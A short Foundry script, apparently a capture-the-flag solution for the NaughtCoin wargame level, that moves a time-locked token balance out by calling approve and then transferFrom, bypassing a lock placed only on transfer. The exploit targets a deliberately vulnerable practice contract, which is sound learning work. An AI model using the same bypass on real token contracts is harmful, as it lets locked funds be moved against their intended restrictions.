// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/Ilevel15.sol";

contract POC is Script {

    NaughtCoin level15 = NaughtCoin(0x3212D0421E355a28150991E610d0e01fa7b7Cf66);

    function run() external{
        vm.startBroadcast();
        address myWallet = 0xEAce4b71CA1A128e8B562561f46896D55B9B0246;
        uint myBal = level15.balanceOf(myWallet);
        console.log("Current balance is: ", myBal);

        level15.approve(myWallet, myBal);
        level15.transferFrom(myWallet, address(level15), myBal);

        console.log("New balance is: ", level15.balanceOf(myWallet));
        vm.stopBroadcast();
    }
}